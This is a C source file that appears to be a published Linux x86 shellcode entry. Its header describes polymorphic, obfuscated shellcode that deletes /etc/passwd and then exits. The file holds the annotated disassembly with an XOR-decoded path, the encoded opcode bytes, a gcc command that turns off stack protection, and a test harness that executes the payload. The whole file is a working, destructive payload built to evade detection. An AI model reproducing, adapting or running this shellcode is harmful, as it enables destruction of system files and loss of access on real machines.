/*

Title   : Polymorphic/obfuscated (1) unlink '/etc/passwd' and (2) exit (43 bytes)
Date    : 12th Sep 2019
Author  : Vikrant Navalgund
System  : Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:06:14 UTC 2016 i686 i686 i686 GNU/Linux

To build:
gcc -fno-stack-protector -z execstack -o shellcode shellcode.c

00000000  31C9              xor ecx,ecx
00000002  F7E9              imul ecx
00000004  68CBC9E400        push dword 0xe4c9cb
00000009  688FCEF9C9        push dword 0xc9f9ce8f
0000000E  6887CBC4F1        push dword 0xf1c4cb87
00000013  89E3              mov ebx,esp
00000015  B10B              mov cl,0xb
00000017  0402              add al,0x2
00000019  803424AA          xor byte [esp],0xaa
0000001D  000424            add [esp],al
00000020  44                inc esp
00000021  E2F4              loop 0x17
00000023  2C0C              sub al,0xc
00000025  CD80              int 0x80
00000027  FEC0              inc al
00000029  CD80              int 0x80

*/

#include <stdio.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe9\x68\xcb\xc9\xe4\x00\x68\x8f\xce\xf9\xc9\x68\x87"
"\xcb\xc4\xf1\x89\xe3\xb1\x0b\x04\x02\x80\x34\x24\xaa\x00\x04\x24"
"\x44\xe2\xf4\x2c\x0c\xcd\x80\xfe\xc0\xcd\x80";

int main()
{
    printf("Shellcode Length: %d bytes\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}
